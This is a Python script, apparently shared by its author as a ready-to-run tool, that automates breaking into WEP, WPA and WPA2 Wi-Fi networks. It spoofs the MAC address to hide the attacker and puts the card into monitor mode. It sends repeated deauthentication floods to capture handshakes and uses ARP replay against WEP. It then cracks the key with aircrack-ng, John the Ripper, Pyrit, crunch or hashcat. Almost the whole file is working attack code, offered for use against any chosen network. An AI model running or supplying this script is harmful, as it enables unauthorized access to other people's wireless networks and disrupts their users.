# Semi-automatic and simple (but working!) WEP/WPA/WPA2 Hacking script 
# External tools involved: Aircrack-ng pack, John the Ripper, Hashcat Ocl, Pyrit, Crunch, xterm.
# Author: D35m0nd142 

#!/usr/bin/python
# -*- coding: utf-8 -*-
import os, sys, time
from termcolor import colored

def killctrl():
	os.system("airmon-ng check kill")

print "\n+===========================================================================+"
print "| DWH - Simple (but working) WEP/WPA/WPA2 Hacking script                    |"
print "| Author: D35m0nd142, https://twitter.com/d35m0nd142                        |"
print "| Usage: Just run it and let it head you :)                                 |" 
print "+===========================================================================+\n"
time.sleep(1.5)

print "[*] Removing useless files..."
os.system("rm -rf capture* || true")
print "[*] Stopping (if existent) previous monitor modes..."
os.system("airmon-ng stop mon0 > dwhs_out.txt && rm dwhs_out.txt")
os.system("ifconfig mon0 down")
print "[*] Rising permissions...\n";
os.system("chmod 777 *")
print colored("[SUCCESS] OK, I am ready to start now! ;)\n", 'yellow')
os.system("airmon-ng")
inf = raw_input("Enter your network interface -> ")
print "[*] Spoofing MAC Address to hide your ass...\n"
cmd = "macchanger -r %s" %inf
os.system(cmd)
cmd = "airmon-ng start %s > processes.txt" %inf
os.system(cmd)
killctrl()
print "[WARNING] Press CTRL-C when you find the network you want to hack."
time.sleep(3)
os.system("airodump-ng mon0")
enc = raw_input("Enter the encryption of the network -> ")
bssid = raw_input("Enter the BSSID of the network you want to hack -> ")
ssid = raw_input("Enter the ESSID of the network you have chosen -> ")
ch = raw_input("Enter the channel on which the network is listening -> ")
cmd = "xterm -hold -e \"airodump-ng -w capture_file --bssid %s -c %s mon0\" &" %(bssid, ch)
os.system(cmd)

def client_send():
	client = raw_input("Enter the BSSID (STATION) of a client connected to the network -> ")
	cmd = "aireplay-ng -0 10 -a %s -c %s mon0" %(bssid, client)
 
	for count in range(1,15):
		os.system(cmd)

	print colored("[WARNING] Check if \"WPA Handshake\" appeared in the other shell. Otherwise it is useless to go on!\n", 'red')
	time.sleep(1)

# WPA/WPA2 Hacking
if(enc == "WPA" or enc == "WPA2" or enc == "wpa" or enc == "wpa2"): 
	retry = "y"
	while(retry == "y" or retry == "Y" or retry == "yes"):
		client_send()
		retry = raw_input("Do you want to try with another connected client? [necessary if handshake did not appear] (y/n) ")

	print "\n[*] Choose how to crack encrypted data: \n"
	print "  1) Wordlist"
	print "  2) BruteForce (Crunch with letters and numbers)"
	print "  3) JTR"
	print "  4) JTR+Pyrit"  
	print "  5) JTR+Aircrack"
	print "  6) Hashcat"
	choice = raw_input("\n  -> ")

	if(choice == "1"):
		cmd = "aircrack-ng capture_file-01.cap -w ./wordlist.lst"
	elif(choice == "2"):
		cmd = "crunch 8 20 abcdefghilmnopqrstuvwyxzkjABCDEFGHILMNOPQRSTUWYXZJ0123456789 | aircrack-ng -b %s capture_file-01.cap -w - -e %s" %(bssid, ssid)
	elif(choice == "3"):
		cmd = "john --incremental=all --stdout | aircrack-ng -b %s capture_file-01.cap -w - -e %s" %(bssid, ssid)
	elif(choice == "4"):
		cmd = "john --incremental=all --stdout | pyrit -r capture_file-01.cap -b %s -i - attack_passthrough" %(bssid)
	elif(choice == "5"):
		cmd = "john --stdout --wordlist=wordlist.lst | aircrack-ng -b %s -e %s -w - capture_file-01.cap" %(bssid, ssid)
	else:
		os.system("aircrack-ng capture_file-01.cap -J hcfile")
		print colored("[WARNING] Hashcat module provides 3 different attacks. Stop the current one by yourself in case the previous one has been successfull.","red")
		time.sleep(2)
		print "[*] Using Hashcat Dictionary attack..."
		time.sleep(1)
		wlist = raw_input("[*] Enter your wordlist -> ") 
		cmd = "hashcat -m 2500 hcfile.hccap %s" %wlist
		os.system(cmd)  
		time.sleep(1)
		print "\n[*] Using Hashcat Rule-based attack..."
		time.sleep(1)
		cmd = "hashcat -m 2500 -r rules/best64.rule hcfile.hccap %s" %wlist
		os.system(cmd)
		time.sleep(1)
		print "\n[*] Using Hashcat Brute-Force attack..."
		time.sleep(1)
		print """\n?l = abcdefghijklmnopqrstuvwxyz
?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
?d = 0123456789
?s =  space\"#$%&'()*+,-./:;<=>?@[\]^_`{|}~" 
?a = ?l?u?d?s
?b = 0x00 - 0xff\n"""
		brute = raw_input("Enter your bruteforce custom-charset (ex: ?l?d) -> ")
		string = ""
		found = False
		try:
			os.remove("dwhs_dec.txt")
		except:
			pass
		while(found is False): # This loop was implemented keeping in mind Hashcat 0.49. If you have Hashcat 0.50 you can use "--increment" flag and
							   # replace this piece of code. As you wish. 
			string = string + "?1"
			pwmin = len(string)/2
			print "..Using %s characters.." %pwmin 
			time.sleep(0.3)
			cmd = "hashcat -m 2500 -a 3 -n 32 --custom-charset1=%s --pw-min=%s hcfile.hccap %s -o dwhs_dec.txt" %(brute,pwmin,string) 
			os.system(cmd)
			with open('dwhs_dec.txt') as f:
				if(len(f.read()) > 0):
					found = True
	if(choice == "1" or choice == "2" or choice == "3" or choice == "4" or choice == "5"):
		os.system(cmd)

# WEP Hacking
else: 
	cmd = "aireplay-ng -1 0 -a %s mon0" %bssid
	os.system(cmd) # check if AUTH is OPN
	cmd = "xterm -hold -e \"aireplay-ng -3 -b %s mon0\" &" %bssid
	os.system(cmd)	
	cmd = "aireplay-ng -0 0 -a %s mon0" %bssid # it speeds up retrieving packets
	for count in range(1,7):
		os.system(cmd)	
	goon = raw_input("\n[WARNING] Wait until you got AT LEAST 30K packets, then press ENTER to go on...")
	cmd = "aircrack-ng capture_file-01.cap"
	os.system(cmd)

print "Bye ;-)\n"



